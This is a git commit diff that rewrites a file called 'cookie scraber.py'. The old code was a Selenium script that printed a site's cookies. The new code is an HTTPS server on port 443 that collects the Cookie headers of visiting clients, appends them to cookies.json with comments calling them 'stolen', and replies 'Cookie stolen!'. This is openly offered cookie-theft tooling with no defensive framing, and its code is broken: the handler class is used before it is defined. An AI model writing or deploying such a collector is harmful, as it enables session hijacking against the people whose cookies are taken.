1b962c674c84a50d1b7e5505aa832396d8c7477c
Elon masai <123534505+elonmasai7@users.noreply.github.com>
2024-09-23 22:45:39 +0300

    Update cookie scraber.py

--- cookie scraber.py
+++ cookie scraber.py
@@ -1,16 +1,37 @@
-from selenium import webdriver
-import time
+import http.server
+import http.cookies
+import ssl
+import os
 
-driver = webdriver.Chrome()
+# Set up HTTPS server
+server_address = ('', 443)
+httpd = http.server.HTTPServer(server_address, RequestHandler)
+httpd.socket = ssl.wrap_socket(httpd.socket, certfile='server.crt', keyfile='server.key')
 
-try:
-    url = input("Please enter the URL you want to visit (e.g., http://example.com): ")
-    driver.get(url)
-    time.sleep(10)
-    cookies = driver.get_cookies()
-    print("Cookies obtained:")
-    for cookie in cookies:
-        print(cookie)
+# Define a secure cookie storage mechanism
+cookie_storage = os.path.join(os.path.dirname(__file__), 'cookies.json')
 
-finally:
-    driver.quit()
+class RequestHandler(http.server.BaseHTTPRequestHandler):
+    def do_GET(self):
+        # Parse cookies from request headers
+        cookies = http.cookies.SimpleCookie(self.headers.get('Cookie'))
+        cookie_data = {}
+        for cookie in cookies:
+            cookie_data[cookie] = cookies[cookie].value
+
+        # Store stolen cookies securely
+        with open(cookie_storage, 'a') as f:
+            import json
+            json.dump(cookie_data, f)
+            f.write('\n')
+
+        # Return a response to the client
+        self.send_response(200)
+        self.end_headers()
+        self.wfile.write(b'Cookie stolen!')
+
+    def do_POST(self):
+        # Handle POST requests (e.g., for cookie injection)
+        pass
+
+httpd.serve_forever()
